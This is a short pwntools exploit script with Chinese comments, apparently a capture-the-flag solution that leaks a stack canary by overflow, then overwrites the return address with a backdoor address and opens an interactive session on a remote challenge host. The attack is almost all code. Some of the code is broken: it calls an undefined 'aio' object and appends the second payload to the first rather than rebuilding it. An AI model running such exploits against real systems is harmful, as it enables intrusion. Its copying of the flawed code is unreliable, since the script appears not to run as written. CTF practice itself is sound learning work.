from pwn import *

context.log_level = 'debug'
io = remote('pwn.challenge.ctf.show', 28252)

# backdoor = 0x80485a6：backdoor函数的地址
backdoor = 0x80485a6

# 方法一：通过栈溢出泄露canary
aio.recvuntil("Try Bypass Me!")

# 发送200个'a'，触发canary保护
payload = b'a' * 200
io.sendline(payload)

# 接收canary值，减去0xa（换行符）
aio.recvuntil(b'a' * 200)
canary = u32(io.recv(4)) - 0xa
print(hex(canary))

# 构造payload，包含canary和backdoor地址
payload += p32(canary)
payload += b'a' * 12
payload += p32(backdoor)

io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：canary bypass - Canary保护绕过
2. 核心原理：
   - 利用栈溢出泄露canary值
   - 然后构造包含正确canary的payload，绕过保护
3. 关键步骤：
   - 发送足够长度的payload，触发canary保护
   - 接收并解析canary值
   - 构造包含canary的payload，覆盖返回地址为backdoor
4. 执行流程：
   - 第一次发送：泄露canary
   - 第二次发送：构造包含canary的payload，执行backdoor
5. 技术要点：
   - Canary保护机制：栈溢出时会覆盖canary，触发程序崩溃
   - 泄露canary后，在payload中包含正确的canary值，绕过保护
   - 另一种方法是使用格式化字符串泄露canary
"""
